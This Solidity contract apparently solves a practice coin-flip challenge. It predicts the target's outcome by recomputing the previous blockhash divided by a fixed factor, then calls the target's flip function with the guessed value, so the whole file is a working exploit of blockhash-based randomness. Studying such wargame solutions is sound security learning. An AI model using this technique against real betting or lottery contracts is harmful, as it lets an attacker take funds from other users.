// SPDX-License-Identifier
pragma solidity ^0.8.0;

import '@openzeppelin/contracts/utils/math/SafeMath.sol';

contract CoinFlipSolution {
  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function flip(address contractAddress) public {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);

    bytes memory payload = abi.encodeWithSignature("flip(bool)", coinFlip);
    (bool success, bytes memory returnData) = contractAddress.call(payload);
    require(success);
  }
}